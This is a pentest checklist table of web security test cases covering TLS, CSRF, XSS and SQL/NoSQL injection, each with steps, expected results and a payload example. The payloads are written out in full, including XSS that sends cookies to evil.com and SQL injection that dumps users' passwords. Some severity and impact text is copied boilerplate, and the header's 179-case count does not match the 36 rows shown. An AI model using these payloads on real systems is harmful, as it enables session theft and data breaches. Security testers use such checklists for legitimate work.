# 20. Security Features — Checklist

Feature-area security **test cases** for “20. Security Features” — functionality-driven, impact-first with severity + CVSS.

*179 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| SEC-001 | HTTP to HTTPS Redirect Verification | Transport Security (WSTG-CONF-07) | HTTPS Enforcement | 1. Access the application using HTTP (port 80).<br>2. Check if 301/302 redirect to HTTPS occurs.<br>3. Verify all subdomains also redirect.<br>4. Check if the redirect is permanent (301) not temporary (302).<br>5. Verify no sensitive data is exposed before redirect. | Application must immediately redirect all HTTP requests to HTTPS using a 301 permanent redirect without exposing any sensitive content over HTTP. | <code>curl -I http://target.com;curl -I http://www.target.com;curl -I http://api.target.com;curl -I http://admin.target.com</code> | Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | cURL;Burp Suite;SSLscan | CWE-319; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-01 |
| SEC-002 | HSTS Header Verification | Transport Security (WSTG-CONF-07) | HTTPS Enforcement | 1. Access the application over HTTPS.<br>2. Check response headers for Strict-Transport-Security.<br>3. Verify max-age is at least 31536000 (1 year).<br>4. Check for includeSubDomains directive.<br>5. Check for preload directive.<br>6. Verify HSTS header is not set on HTTP responses. | Application must include Strict-Transport-Security header with adequate max-age and includeSubDomains directive on all HTTPS responses. | <code>Check for Strict-Transport-Security: max-age=31536000; includeSubDomains; preload in response headers</code> | Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;SecurityHeaders.com;cURL | CWE-319; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-01 |
| SEC-003 | TLS Version and Cipher Suite Assessment | Cryptography (WSTG-CRYP-01) | HTTPS Enforcement | 1. Scan the server for supported TLS versions.<br>2. Verify TLS 1.0 and 1.1 are disabled.<br>3. Check that only TLS 1.2 and TLS 1.3 are supported.<br>4. Verify weak cipher suites like RC4 and DES and 3DES and NULL are disabled.<br>5. Confirm forward secrecy ciphers are preferred. | Application must support only TLS 1.2+ with strong cipher suites and prefer forward secrecy ciphers while rejecting all legacy protocols. | <code>Test for SSLv2;SSLv3;TLS1.0;TLS1.1 acceptance;check for RC4;DES;3DES;NULL;EXPORT;anon cipher suites</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | SSLscan;testssl.sh;Nmap ssl-enum-ciphers;sslyze | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| SEC-004 | Mixed Content Detection | Transport Security (WSTG-CONF-07) | HTTPS Enforcement | 1. Browse all application pages over HTTPS.<br>2. Open browser developer console and check for mixed content warnings.<br>3. Inspect all resource loading for HTTP URLs.<br>4. Check dynamically loaded content.<br>5. Verify WebSocket connections use wss:// not ws://. | Application must serve all resources including images and scripts and stylesheets and fonts and APIs over HTTPS with no mixed content. | <code>Search page source for http:// references in src= and href= and action= and url( attributes on HTTPS pages</code> | Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Browser DevTools;Burp Suite;Mixed Content Scanner | CWE-319; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-01 |
| SEC-005 | SSL Certificate Validation | Cryptography (WSTG-CRYP-01) | HTTPS Enforcement | 1. Check SSL certificate validity period.<br>2. Verify certificate is issued by a trusted CA.<br>3. Check that certificate Common Name or SAN matches the domain.<br>4. Verify certificate chain is complete.<br>5. Check for certificate revocation status via OCSP/CRL.<br>6. Ensure no self-signed certificates in production. | Application must use a valid certificate from a trusted CA with proper domain matching and complete certificate chain. | <code>Check for expired certs;self-signed certs;hostname mismatch;incomplete chains;revoked certificates</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | SSLscan;testssl.sh;OpenSSL;Browser | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| SEC-006 | SSL Stripping Attack Test | Transport Security (WSTG-CONF-07) | HTTPS Enforcement | 1. Position as MITM between client and server.<br>2. Intercept HTTPS redirects and serve HTTP to the client.<br>3. Check if HSTS prevents the downgrade.<br>4. Test on first visit without HSTS preload.<br>5. Verify cookie security flags. | Application must implement HSTS with preloading and set Secure flag on all cookies to prevent SSL stripping attacks. | <code>Use sslstrip to intercept and downgrade HTTPS connections;verify HSTS preload status</code> | Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | sslstrip;mitmproxy;Bettercap;Wireshark | CWE-319; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-01 |
| SEC-007 | TLS Renegotiation Vulnerability Test | Cryptography (WSTG-CRYP-01) | HTTPS Enforcement | 1. Test for client-initiated TLS renegotiation support.<br>2. Check for insecure renegotiation vulnerability.<br>3. Verify if renegotiation DoS is possible.<br>4. Test for CRIME and BREACH compression attacks. | Application must disable client-initiated renegotiation and support only secure renegotiation while disabling TLS compression. | <code>openssl s_client -connect target.com:443 then send R to test renegotiation;check for TLS compression</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | OpenSSL;testssl.sh;Nmap | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| SEC-008 | Certificate Pinning Verification | Cryptography (WSTG-CRYP-01) | HTTPS Enforcement | 1. If the application is a mobile app or uses certificate pinning check pinning implementation.<br>2. Attempt to intercept traffic with a custom CA.<br>3. Verify if pinning can be bypassed.<br>4. Check for pin backup key. | Application must implement certificate pinning correctly in mobile apps and critical connections with backup pins for rotation. | <code>Attempt traffic interception with Burp CA;use Frida/Objection to bypass pinning;check for Public-Key-Pins header</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Frida;Objection;Mobile Security Framework | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| SEC-009 | Insecure Protocol Fallback Test | Transport Security (WSTG-CONF-07) | HTTPS Enforcement | 1. Test if the server supports protocol downgrade via SCSV.<br>2. Check for POODLE vulnerability by testing SSLv3 fallback.<br>3. Verify TLS_FALLBACK_SCSV is supported.<br>4. Test for DROWN vulnerability on shared keys. | Application must support TLS_FALLBACK_SCSV and not allow protocol downgrade to insecure versions. | <code>Test for SSLv3 fallback;check DROWN;POODLE;BEAST;LUCKY13;Heartbleed vulnerabilities</code> | Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | testssl.sh;SSLscan;Nmap;OpenSSL | CWE-319; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-01 |
| SEC-010 | Secure Cookie Flags Over HTTPS | Session Management (WSTG-SESS-02) | HTTPS Enforcement | 1. Login and inspect all cookies set by the application.<br>2. Verify each sensitive cookie has the Secure flag.<br>3. Check for HttpOnly flag on session cookies.<br>4. Verify SameSite attribute.<br>5. Check cookie scope. | All sensitive cookies must have Secure; HttpOnly; and SameSite=Strict or Lax flags set to prevent exposure over insecure channels. | <code>Check Set-Cookie headers for missing Secure;HttpOnly;SameSite attributes on session and authentication cookies</code> | Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Browser DevTools;EditThisCookie | CWE-319; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-01 |
| SEC-011 | CSRF Token Presence Verification | CSRF (WSTG-SESS-05) | CSRF Protection | 1. Navigate to all forms and state-changing operations.<br>2. Inspect each form for CSRF token presence.<br>3. Check AJAX requests for CSRF token in headers or body.<br>4. Verify tokens in multipart form submissions.<br>5. Identify any forms missing CSRF protection. | All state-changing requests must include a valid CSRF token either as a hidden form field or custom request header. | <code>Check all POST/PUT/DELETE forms for hidden input name=csrf_token or _token or X-CSRF-Token header in AJAX</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Browser DevTools | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| SEC-012 | CSRF Token Validation Bypass via Empty Token | CSRF (WSTG-SESS-05) | CSRF Protection | 1. Submit a state-changing request with a valid CSRF token.<br>2. Remove the CSRF token parameter entirely.<br>3. Submit with an empty CSRF token value.<br>4. Submit with csrf_token=null or csrf_token=undefined.<br>5. Check if the request is processed. | Application must reject all requests with missing or empty CSRF tokens for state-changing operations. | <code>Remove csrf_token parameter;set csrf_token=;csrf_token=null;csrf_token=undefined;csrf_token=0</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;Postman | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| SEC-013 | CSRF Token Reuse Across Sessions | CSRF (WSTG-SESS-05) | CSRF Protection | 1. Login as User A and capture the CSRF token.<br>2. Logout and login as User B.<br>3. Use User A's CSRF token in User B's session.<br>4. Check if the request is accepted with a cross-session token. | CSRF tokens must be bound to the user's session and not be interchangeable between different sessions. | <code>Capture csrf_token from Session A;use in Session B's POST request;check if cross-session token is accepted</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Postman | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| SEC-014 | CSRF Token Reuse After Expiry | CSRF (WSTG-SESS-05) | CSRF Protection | 1. Capture a valid CSRF token.<br>2. Wait for an extended period beyond expected token lifetime.<br>3. Attempt to use the old token.<br>4. Check if expired tokens are still accepted.<br>5. Verify token rotation on use. | CSRF tokens must have a reasonable expiry and be invalidated after use or session change. | <code>Use captured csrf_token after 24+ hours;reuse same token for multiple requests without refreshing</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;Postman | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| SEC-015 | CSRF via HTTP Method Override | CSRF (WSTG-SESS-05) | CSRF Protection | 1. Identify state-changing operations using POST.<br>2. Convert POST to GET request with same parameters.<br>3. Try HTTP method override headers like X-HTTP-Method-Override or _method.<br>4. Check if CSRF validation is bypassed for non-POST methods. | Application must enforce CSRF protection regardless of HTTP method and reject method override headers for security-critical operations. | <code>Convert POST /api/delete to GET /api/delete?id=1;add X-HTTP-Method-Override: POST to GET request;add _method=POST parameter</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Postman | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| SEC-016 | CSRF Token in Cookie vs Header Mismatch | CSRF (WSTG-SESS-05) | CSRF Protection | 1. Check if the application uses double-submit cookie pattern.<br>2. Modify the CSRF cookie value but keep the header value.<br>3. Modify the header value but keep the cookie.<br>4. Set both to the same arbitrary value.<br>5. Check validation logic. | Application must properly validate double-submit CSRF tokens by comparing cookie and header values using cryptographic binding to the session. | <code>Set CSRF cookie to value_A and header to value_B;set both to arbitrary same value like test123;check acceptance</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Postman | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| SEC-017 | CSRF Protection Bypass via Content-Type Change | CSRF (WSTG-SESS-05) | CSRF Protection | 1. Identify a JSON API endpoint with CSRF protection.<br>2. Change Content-Type from application/json to application/x-www-form-urlencoded.<br>3. Change to text/plain.<br>4. Change to multipart/form-data.<br>5. Check if CSRF validation varies by content type. | Application must enforce CSRF protection consistently regardless of Content-Type header and validate tokens for all content types. | <code>Change Content-Type: application/json to text/plain or application/x-www-form-urlencoded;submit same data without CSRF token</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Postman | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| SEC-018 | CSRF via Subdomain Cookie Injection | CSRF (WSTG-SESS-05) | CSRF Protection | 1. If CSRF uses double-submit cookie pattern check cookie domain scope.<br>2. Find XSS on any subdomain.<br>3. Inject CSRF cookie via subdomain XSS.<br>4. Craft CSRF attack using the injected cookie value. | Application must scope CSRF cookies to the specific domain and use server-side session binding for CSRF validation rather than relying solely on double-submit. | <code>Exploit XSS on subdomain to set document.cookie='csrf_token=attacker_value;domain=.target.com' then submit CSRF with matching header</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| SEC-019 | CSRF Token Predictability Assessment | CSRF (WSTG-SESS-05) | CSRF Protection | 1. Collect multiple CSRF tokens from the application.<br>2. Analyze token format and entropy.<br>3. Check for sequential patterns or timestamp-based generation.<br>4. Attempt to predict the next token.<br>5. Verify cryptographic randomness. | CSRF tokens must be generated using cryptographically secure random number generators with sufficient entropy to prevent prediction. | <code>Collect 100+ CSRF tokens;analyze with Burp Sequencer;check entropy;test for predictable patterns</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite Sequencer;Custom Scripts | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| SEC-020 | SameSite Cookie Attribute Verification | CSRF (WSTG-SESS-05) | CSRF Protection | 1. Check SameSite attribute on all session cookies.<br>2. Verify if SameSite=Strict or SameSite=Lax is set.<br>3. Test cross-site request behavior with different SameSite values.<br>4. Check for SameSite=None without Secure flag. | Session cookies must have SameSite=Strict or SameSite=Lax and if SameSite=None is required it must be paired with the Secure flag. | <code>Check Set-Cookie for SameSite attribute;test cross-site form submission behavior;verify SameSite=None;Secure</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;Browser DevTools | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| SEC-021 | Reflected XSS in URL Parameters | Cross-Site Scripting (WSTG-INPV-01) | XSS Prevention | 1. Identify all URL parameters that reflect user input.<br>2. Inject basic XSS payloads in each parameter.<br>3. Test with event handlers and script tags and HTML injection.<br>4. Check various encoding contexts like HTML and attribute and JavaScript.<br>5. Test with WAF bypass payloads. | Application must encode all reflected output based on the rendering context and reject or sanitize malicious input. | <code>&lt;script&gt;alert(1)&lt;/script&gt;;&lt;img src=x onerror=alert(1)&gt;;&lt;svg/onload=alert(1)&gt;;javascript:alert(1);"&gt;&lt;script&gt;alert(1)&lt;/script&gt;;'-alert(1)-'</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;XSS Hunter;Dalfox;XSStrike | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| SEC-022 | Stored XSS in User-Generated Content | Cross-Site Scripting (WSTG-INPV-02) | XSS Prevention | 1. Identify all fields that store user input and display to other users.<br>2. Inject XSS payloads in each field.<br>3. Submit and view the content as another user.<br>4. Test in different rendering contexts.<br>5. Check admin panels viewing user data. | Application must sanitize all stored user content on input and encode on output to prevent stored XSS across all rendering contexts. | <code>&lt;script&gt;fetch('https://evil.com/?c='+document.cookie)&lt;/script&gt;;&lt;img src=x onerror=alert(document.domain)&gt;;&lt;svg/onload=alert(1)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;XSS Hunter;BeEF | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| SEC-023 | DOM-Based XSS Detection | Cross-Site Scripting (WSTG-CLNT-01) | XSS Prevention | 1. Analyze JavaScript source code for DOM manipulation sinks.<br>2. Identify sources like location.hash and document.URL and window.name.<br>3. Test sinks like innerHTML and document.write and eval.<br>4. Craft payloads that flow from source to sink.<br>5. Test with hash-based and fragment-based payloads. | Application must avoid using dangerous DOM sinks with user-controlled data and implement proper DOM sanitization. | <code>https://target.com/page#&lt;img src=x onerror=alert(1)&gt;;javascript:void(document.location='https://evil.com/?c='+document.cookie)</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite DOM Invader;Browser DevTools;DOM XSS Scanner | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| SEC-024 | XSS Filter Bypass via Encoding | Cross-Site Scripting (WSTG-INPV-01) | XSS Prevention | 1. Identify XSS filters in place.<br>2. Try HTML entity encoding bypasses.<br>3. Test URL encoding and double URL encoding.<br>4. Test Unicode encoding and UTF-7.<br>5. Try hex encoding and octal encoding.<br>6. Test null byte injection before payloads. | Application must decode all input layers before validation and apply context-aware output encoding to prevent encoding-based XSS bypasses. | <code>&amp;#x3C;script&amp;#x3E;alert(1)&amp;#x3C;/script&amp;#x3E;;%3Cscript%3Ealert(1)%3C/script%3E;%253Cscript%253E;&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSStrike;Dalfox | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| SEC-025 | XSS in HTTP Headers | Cross-Site Scripting (WSTG-INPV-01) | XSS Prevention | 1. Check if any HTTP response headers reflect user input.<br>2. Test Referer header reflection.<br>3. Test User-Agent header reflection.<br>4. Test custom headers for XSS.<br>5. Check for header injection leading to response splitting. | Application must sanitize all user-controlled values reflected in HTTP headers and prevent header injection. | <code>Set Referer: &lt;script&gt;alert(1)&lt;/script&gt;;User-Agent: &lt;img/src=x onerror=alert(1)&gt;;X-Custom: test\r\nContent-Type: text/html</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;cURL | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| SEC-026 | XSS in File Upload Names | Cross-Site Scripting (WSTG-INPV-02) | XSS Prevention | 1. Upload a file with XSS payload in the filename.<br>2. Check if the filename is reflected on the page without encoding.<br>3. Test with SVG files containing JavaScript.<br>4. Upload HTML files and access directly. | Application must sanitize uploaded filenames and serve user-uploaded content with Content-Type restrictions and Content-Disposition: attachment. | <code>Upload file named &lt;script&gt;alert(1)&lt;/script&gt;.jpg;upload test.svg with embedded JavaScript;upload test.html with XSS</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Custom Files | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| SEC-027 | XSS via JSON Response Injection | Cross-Site Scripting (WSTG-INPV-01) | XSS Prevention | 1. Identify JSON API responses that include user input.<br>2. Check Content-Type header for proper application/json.<br>3. Test if response can be rendered as HTML.<br>4. Inject HTML/JS in JSON values.<br>5. Check for JSONP endpoints. | Application must set Content-Type: application/json on all JSON responses and sanitize data values to prevent XSS if content type is misinterpreted. | <code>{"name":"&lt;script&gt;alert(1)&lt;/script&gt;"};check JSONP callback for injection: callback=alert(1)//;test with X-Content-Type-Options: nosniff</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Postman | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| SEC-028 | XSS via Error Messages | Cross-Site Scripting (WSTG-INPV-01) | XSS Prevention | 1. Trigger application errors with malicious input.<br>2. Check if error messages reflect the input without encoding.<br>3. Test 404 pages with XSS in the URL path.<br>4. Test validation error messages.<br>5. Check debug error pages. | Application must encode all error messages including reflected input to prevent XSS through error handling. | <code>Access /page/&lt;script&gt;alert(1)&lt;/script&gt;;submit invalid data with XSS in field values;trigger stack traces with reflected input</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Browser | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| SEC-029 | Mutation XSS (mXSS) Testing | Cross-Site Scripting (WSTG-INPV-01) | XSS Prevention | 1. Identify fields sanitized by DOMPurify or similar libraries.<br>2. Test mutation XSS payloads that bypass sanitization through browser DOM mutation.<br>3. Test with nested tags that mutate during parsing.<br>4. Check for namespace confusion. | Application must use up-to-date sanitization libraries and test for mXSS vectors specific to the browser's HTML parser. | <code>&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img title="--&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;"&gt;;noscript bypass payloads</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Browser DevTools;DOMPurify Bypass Lists | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| SEC-030 | XSS via WebSocket Messages | Cross-Site Scripting (WSTG-INPV-02) | XSS Prevention | 1. Identify WebSocket connections that display messages in the DOM.<br>2. Send XSS payloads via WebSocket.<br>3. Check if incoming WebSocket messages are sanitized before DOM insertion.<br>4. Test real-time chat or notification features. | Application must sanitize all WebSocket message content before inserting into the DOM to prevent real-time XSS attacks. | <code>Send {"message":"&lt;img src=x onerror=alert(document.cookie)&gt;"} via WebSocket;inject &lt;script&gt; tags in WS messages</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;wscat;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| SEC-031 | Classic SQL Injection in GET Parameters | Injection (WSTG-INPV-05) | SQL Injection Prevention | 1. Identify all GET parameters.<br>2. Inject single quote and observe response.<br>3. Test with boolean-based payloads like OR 1=1 and OR 1=2.<br>4. Test with UNION SELECT statements.<br>5. Check for error-based injection.<br>6. Test time-based blind injection. | Application must use parameterized queries for all database operations and reject or sanitize SQL metacharacters in all inputs. | <code>id=1' OR '1'='1;id=1 UNION SELECT null,username,password FROM users--;id=1' AND SLEEP(5)--;id=1' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite;Havij | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| SEC-032 | SQL Injection in POST Parameters | Injection (WSTG-INPV-05) | SQL Injection Prevention | 1. Identify all POST request parameters.<br>2. Inject SQL payloads in each parameter.<br>3. Test login forms with authentication bypass payloads.<br>4. Test search functionality.<br>5. Test filter and sort parameters. | Application must use parameterized queries for all POST parameter processing and never concatenate user input into SQL queries. | <code>username=admin'--;password=' OR '1'='1;search=test' UNION SELECT table_name FROM information_schema.tables--;filter=price' OR 1=1--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| SEC-033 | Blind SQL Injection Detection | Injection (WSTG-INPV-05) | SQL Injection Prevention | 1. Test for boolean-based blind SQL injection using true/false conditions.<br>2. Test for time-based blind injection using SLEEP or WAITFOR.<br>3. Compare response differences for true and false conditions.<br>4. Test with conditional errors. | Application must prevent all forms of SQL injection including blind variants through consistent use of parameterized queries. | <code>id=1 AND 1=1 vs id=1 AND 1=2 (compare responses);id=1 AND SLEEP(5)--;id=1 AND IF(1=1,SLEEP(5),0)--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| SEC-034 | Second-Order SQL Injection | Injection (WSTG-INPV-05) | SQL Injection Prevention | 1. Register a user with SQL payload in the username or profile fields.<br>2. Trigger application functionality that reads and uses the stored data in a query.<br>3. Check for SQL execution when stored data is used.<br>4. Monitor for delayed SQL errors. | Application must use parameterized queries even when using data retrieved from the database in subsequent queries. | <code>Register with username=admin'--;update profile with bio=' OR 1=1--;store payload that executes when admin views data</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Manual Testing | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| SEC-035 | SQL Injection via HTTP Headers | Injection (WSTG-INPV-05) | SQL Injection Prevention | 1. Test SQL injection in User-Agent header.<br>2. Test in Referer header.<br>3. Test in X-Forwarded-For header.<br>4. Test in Cookie values.<br>5. Test in Accept-Language header.<br>6. Check if any headers are logged to database. | Application must sanitize and use parameterized queries for any HTTP header values that are stored or used in database queries. | <code>User-Agent: ' OR 1=1--;Referer: ' UNION SELECT password FROM users--;X-Forwarded-For: 127.0.0.1' OR '1'='1;Cookie: session=' OR 1=1--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| SEC-036 | NoSQL Injection Testing | Injection (WSTG-INPV-05) | SQL Injection Prevention | 1. If NoSQL database is used inject NoSQL operators in parameters.<br>2. Test MongoDB query operators like $gt and $ne and $regex.<br>3. Test JavaScript injection in $where clauses.<br>4. Test for authentication bypass. | Application must sanitize inputs for NoSQL injection patterns and use parameterized queries or ORM methods. | <code>{"username":{"$ne":""},password:{"$ne":""}};{"$where":"sleep(5000)"};{"user":{"$gt":""}};{"$regex":".&#42;"}</code> | NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | NoSQLMap;Burp Suite;Custom Scripts | CWE-943; [No[SQLi kit](#/checklist/sqli)](#/checklist/nosqli); PortSwigger NoSQL injection |
